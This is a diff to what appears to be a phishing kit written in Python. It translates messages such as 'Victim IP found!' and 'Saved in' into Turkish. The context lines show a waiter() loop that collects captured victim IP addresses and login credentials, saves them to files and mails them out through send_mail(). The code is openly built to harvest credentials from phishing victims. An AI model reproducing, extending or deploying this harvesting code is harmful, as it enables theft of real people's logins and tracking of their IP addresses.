@@ -772,7 +772,7 @@ def add_zip():
 # Polite Exit
 def pexit():
     killer()
-    sprint(f"\n{info2}Thanks for using!\n{nc}")
+    sprint(f"\n{info2}KULLANDIĞIN İÇİN TEŞEKKÜR EDİYORUM :)\n{nc}")
     exit(0)
 
 
@@ -1425,14 +1425,14 @@ def waiter():
     try:
         while True:
             if isfile(ip_file):
-                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
+                print(f"\n\n{success}{bgreen}Kurbanın IP BİLGİLERİ !!!!\n\007")
                 show_file_data(ip_file)
                 ipdata = cat(ip_file)
                 append(ipdata, main_ip)
                 # Just add the ip
                 append(ipdata.split("\n")[0], saved_file)
-                print(f"\n{info2}Saved in {main_ip}")
-                print(f"\n{info}{blue}Waiting for next.....{cyan}Çıkmak İçin {red}Ctrl+C{cyan} BASABİLİRSİN")
+                print(f"\n{info2}KAYIT EDİLDİ !! {main_ip}")
+                print(f"\n{info}{blue}SONRAKİNİ BEKLİYORUM{cyan}Çıkmak İçin {red}Ctrl+C{cyan} BASABİLİRSİN")
                 remove(ip_file)
             if isfile(cred_file):
                 print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
@@ -1442,7 +1442,7 @@ def waiter():
                     send_mail(userdata)
                 append(userdata, main_cred)
                 append(userdata, saved_file)
-                print(f"\n{info2}Saved in {main_cred}")
+                print(f"\n{info2}KAYIT EDİLDİ !! {main_cred}")
                 print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                 remove(cred_file)
             sleep(0.75)
